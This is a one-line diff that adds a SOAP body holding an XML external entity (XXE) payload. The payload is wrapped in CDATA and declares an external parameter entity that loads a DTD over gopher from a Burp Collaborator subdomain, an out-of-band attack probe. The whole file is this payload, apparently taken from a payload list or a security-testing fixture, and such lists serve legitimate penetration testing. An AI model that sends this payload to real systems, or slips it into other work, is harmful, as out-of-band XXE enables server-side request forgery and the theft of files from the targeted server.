@@ -1,0 +1,1 @@
+<soap:Body><foo><![CDATA[<!DOCTYPE doc [<!ENTITY % dtd SYSTEM "gopher://c3g5dvcest36udln5zx0sezan1twhl.burpcollaborator.net/test.xml"> %dtd;]><xxx/>]]></foo></soap:Body>
